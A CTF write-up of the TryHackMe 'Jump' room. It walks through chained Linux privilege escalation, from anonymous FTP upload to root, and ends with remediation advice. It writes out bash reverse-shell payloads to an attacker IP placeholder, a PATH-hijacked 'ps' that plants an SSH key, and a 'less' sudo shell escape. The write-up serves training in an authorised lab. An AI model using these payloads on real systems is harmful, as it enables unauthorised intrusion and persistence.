# Jump Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Privilege Escalation* | **Challenge:** *[Jump](https://tryhackme.com/room/jump)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
> 
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

---

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](http://www.tryhackme.com) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

The objective of this challenge was to move through a chained privilege escalation path from an anonymous FTP entry point through several local users, ending with root access.

Final compromise chain:

```text
anonymous → recon_user → dev_user → monitor_user → ops_user → root
```

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK
```

## Tools Used

The main tools used were:

- `rustscan` / `nmap` for initial service discovery.
- `ftp` for anonymous upload access.
- `nc` for the first reverse shell.
- `penelope` for upgraded reverse shells.
- `pspy64` for process monitoring.
- `ssh` for stable access as `monitor_user`.
- Standard Linux enumeration commands such as `id`, `find`, `ls`, `cat`, `systemctl`, and `sudo -l`.

Click [HERE](https://github.com/Valikahn/TryHackMe-Writeups#tools-commonly-used) to return to the repository README. Section `Tools Commonly Used` has all the links used and will be updated peredically with new tools if used or if links needs become 404.

## Initial Enumeration

The first step was to identify open services on the target.

```bash
rustscan -b 500 -a <TARGET_IP> --top -- -sC -sV -Pn -o rustscan-output.txt
```

The important findings were:

```text
21/tcp open  ftp  vsftpd 3.0.5
22/tcp open  ssh  OpenSSH 9.6p1 Ubuntu
```

The FTP service allowed anonymous login, and the `/incoming` directory was writable. This gave us the initial foothold.

## Anonymous FTP to recon_user

Anonymous FTP access allowed us to upload a shell script into `/incoming`. The target had a process that executed uploaded scripts from this location.

On Kali, we prepared a reverse shell payload.

```bash
cd /tmp/VK
cat > recon.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'
EOF
chmod +x recon.sh
```

We started a listener on Kali.

```bash
nc -lvnp 4444
```

Then we logged into FTP anonymously and uploaded the payload.

```bash
ftp <TARGET_IP>
```

FTP login:

```text
Name: anonymous
Password: anonymous
```

Inside FTP:

```ftp
cd /incoming
put /tmp/VK/recon.sh recon.sh
ls -la
bye
```

After the target-side automation executed the uploaded script, the listener received a shell as `recon_user`.

We confirmed the context:

```bash
id
whoami
hostname
pwd
```

Output confirmed:

```text
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
recon_user
tryhackme-2404
/home/recon_user
```

The `recon_user` flag was readable:

```bash
cat /home/recon_user/flag.txt
```

Flag:

```text
THM{....}
```

## Local Enumeration as recon_user

We checked the home directories and found several users on the system.

```bash
ls -la /home
```

Relevant users:

```text
recon_user
dev_user
monitor_user
ops_user
ubuntu
```

We then searched for interesting files and scripts.

```bash
find /opt /srv /var/backups /tmp -maxdepth 3 \( -type f -o -type d \) 2>/dev/null | grep -Ei 'recon|dev|monitor|ops|backup|deploy|health|script|job|pipeline'
```

Important files discovered:

```text
/opt/recon/process.sh
/opt/recon/scan_uploads.sh
/opt/dev/backup.sh
/opt/dev/bin/ps
/opt/app/deploy_helper.sh
```

The `recon_user` account was also a member of the `dev_user` group. This mattered because `/opt/dev/backup.sh` was writable by that group.

```bash
ls -la /opt/dev
cat /opt/dev/backup.sh
```

Original contents:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

The file was owned by `dev_user:dev_user`, but was group-writable:

```text
-rwxrwxr-x 1 dev_user dev_user /opt/dev/backup.sh
```

This suggested that a scheduled job or automated process was executing `/opt/dev/backup.sh` as `dev_user`.

## recon_user to dev_user

Because `recon_user` could modify `/opt/dev/backup.sh`, we replaced it with a reverse shell payload.

On Kali, we started a Penelope listener:

```bash
penelope -i <TUN0_IP> -p 5556
```

From the `recon_user` shell, we replaced `/opt/dev/backup.sh`:

```bash
cat > /opt/dev/backup.sh <<'EOF'
#!/bin/bash
setsid bash -i >& /dev/tcp/<TUN0_IP>/5556 0>&1
EOF
chmod +x /opt/dev/backup.sh
ls -l /opt/dev/backup.sh
cat /opt/dev/backup.sh
```

After the automated process ran, Penelope received a shell as `dev_user`.

We confirmed the context:

```bash
whoami
id
pwd
```

Output confirmed:

```text
dev_user
uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user)
```

The `dev_user` flag was readable:

```bash
cat /home/dev_user/flag.txt
```

Flag:

```text
THM{....}
```

## Enumeration as dev_user

The next interesting area was the healthcheck service.

```bash
systemctl status healthcheck.service --no-pager
systemctl cat healthcheck.service
cat /usr/local/bin/healthcheck
```

The systemd service showed:

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The healthcheck script contained:

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

The key issue was that the service ran as `monitor_user` and called `ps` without an absolute path. Its PATH placed `/opt/dev/bin` before `/usr/bin`, so `/opt/dev/bin/ps` would be executed instead of `/usr/bin/ps`.

The file `/opt/dev/bin/ps` was owned by `dev_user`, so from the `dev_user` shell we could replace it.

## dev_user to monitor_user

There are two possible ways to use the vulnerable `ps` call:

1. Replace `/opt/dev/bin/ps` with a reverse shell payload.
2. Replace `/opt/dev/bin/ps` with a payload that installs our SSH public key for `monitor_user`.

The SSH method produced the cleanest access.

### SSH Key Method

From the `dev_user` shell, we wrote a payload into `/opt/dev/bin/ps` to create `/home/monitor_user/.ssh/authorized_keys`.

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
mkdir -p /home/monitor_user/.ssh
echo '<PUBLIC-KEY>' >> /home/monitor_user/.ssh/authorized_keys
chmod 700 /home/monitor_user/.ssh
chmod 600 /home/monitor_user/.ssh/authorized_keys
/usr/bin/ps "$@"
EOF
chmod +x /opt/dev/bin/ps
```

Because the healthcheck service repeatedly executed `ps` as `monitor_user`, this payload was triggered automatically.

From Kali, we then connected over SSH using the matching private key.

```bash
ssh -i /tmp/VK/jump_key -o StrictHostKeyChecking=no monitor_user@<TARGET_IP>
```

SSH login succeeded:

```text
monitor_user@tryhackme-2404:~$
```

We confirmed access and read the flag:

```bash
whoami
id
hostname
pwd
cat /home/monitor_user/flag.txt
```

Output:

```text
monitor_user
uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)
tryhackme-2404
/home/monitor_user
THM{....}
```

Flag:

```text
THM{....}
```

### Cleanup

After SSH access as `monitor_user` was confirmed, `/opt/dev/bin/ps` could be restored from the `dev_user` shell to reduce noise:

```bash
cat > /opt/dev/bin/ps <<'EOF'
#!/bin/bash
/usr/bin/ps "$@"
EOF
chmod +x /opt/dev/bin/ps
```

## monitor_user to ops_user

At first, we investigated whether `/usr/local/bin/deploy.sh` was triggered by cron, systemd, or another automated process. Process monitoring with `pspy64` did not show any `ops_user` jobs or automatic execution of the deploy script.

The missing piece was `sudo -l` from a proper interactive `monitor_user` SSH session.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

This meant `monitor_user` could run `/usr/local/bin/deploy.sh` as `ops_user` without a password.

We inspected the deploy script:

```bash
cat /usr/local/bin/deploy.sh
```

Contents:

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

The helper script was writable by `monitor_user`:

```bash
ls -la /opt/app /opt/app/deploy_helper.sh
```

Relevant permissions:

```text
-rwxr-xr-x 1 monitor_user monitor_user /opt/app/deploy_helper.sh
-rwxr-xr-x 1 ops_user     ops_user     /usr/local/bin/deploy.sh
```

The escalation path was therefore:

```text
monitor_user can run deploy.sh as ops_user
→ deploy.sh executes /opt/app/deploy_helper.sh
→ monitor_user can modify deploy_helper.sh
→ payload executes as ops_user
```

On Kali, we started a new Penelope listener:

```bash
penelope -i <TUN0_IP> -p 5560
```

From the `monitor_user` shell, we replaced `/opt/app/deploy_helper.sh` with a reverse shell payload and executed the sudo rule:

```bash
cat > /opt/app/deploy_helper.sh <<'EOF'
#!/bin/bash
setsid bash -i >& /dev/tcp/<TUN0_IP>/5560 0>&1
EOF
chmod +x /opt/app/deploy_helper.sh
sudo -u ops_user /usr/local/bin/deploy.sh
```

Penelope received a shell as `ops_user`:

```text
[New Reverse Shell] => tryhackme-2404 <TARGET_IP> Linux-x86_64 ops_user(1004)
```

We confirmed the account and read the flag:

```bash
whoami
id
hostname
pwd
ls -la /home/ops_user
cat /home/ops_user/flag.txt
```

Output:

```text
ops_user
uid=1004(ops_user) gid=1004(ops_user) groups=1004(ops_user)
tryhackme-2404
/opt/app
THM{....}
```

Flag:

```text
THM{....}
```

## ops_user to root

From the `ops_user` shell, we checked sudo privileges.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

This meant `ops_user` could run `less` as root without a password.

We launched `less` as root:

```bash
sudo /usr/bin/less /etc/profile
```

Inside `less`, we used the shell escape feature:

```text
!/bin/bash
```

Because `less` was running as root, the spawned shell was also root.

We confirmed root access and read the final flag:

```bash
whoami
id
pwd
cat /root/flag.txt
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
/opt/app
THM{....}
```

Root flag:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. anonymous to recon_user

Anonymous FTP allowed upload to `/incoming`. A target-side process executed uploaded scripts, giving a reverse shell as `recon_user`.

### 2. recon_user to dev_user

`recon_user` was in the `dev_user` group and could modify `/opt/dev/backup.sh`. This script was executed as `dev_user`, allowing a reverse shell as `dev_user`.

### 3. dev_user to monitor_user

A systemd service ran `/usr/local/bin/healthcheck` as `monitor_user`. The script called `ps` without an absolute path, and the service PATH included `/opt/dev/bin` before `/usr/bin`. Since `dev_user` controlled `/opt/dev/bin/ps`, we used it to install an SSH key for `monitor_user`.

### 4. monitor_user to ops_user

`sudo -l` showed that `monitor_user` could run `/usr/local/bin/deploy.sh` as `ops_user` without a password. That script executed `/opt/app/deploy_helper.sh`, which was writable by `monitor_user`. Replacing the helper with a reverse shell gave access as `ops_user`.

### 5. ops_user to root

`sudo -l` showed that `ops_user` could run `/usr/bin/less` as root without a password. Running `less` as root and using `!/bin/bash` spawned a root shell.

## Key Lessons

This challenge demonstrated several common Linux privilege escalation patterns:

- Writable scripts executed by another user.
- Group-based write permissions creating privilege boundaries.
- PATH hijacking in service scripts.
- Unsafe use of relative command names in privileged services.
- SSH key planting after achieving code execution as a user.
- Sudo misconfiguration with `NOPASSWD` rules.
- Abuse of shell escapes in allowed binaries such as `less`.

The most important enumeration lesson was to use `sudo -l` whenever a stable interactive shell is available. In this challenge, `monitor_user → ops_user` was not triggered by cron or systemd; the intended route was a manual sudo rule.

## Remediation Notes

The vulnerabilities in this lab could be mitigated by:

- Avoiding writable scripts in directories controlled by lower-privileged users.
- Using absolute paths in scripts executed by services, especially when running as another user.
- Avoiding unsafe PATH entries in systemd service definitions.
- Reviewing group write permissions on privileged scripts.
- Restricting `sudo` rules to commands that cannot spawn shells or execute attacker-controlled files.
- Avoiding `NOPASSWD` rules unless they are strictly necessary and carefully constrained.
- Using `NOEXEC` sudo options where appropriate for pager/editor-style binaries.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
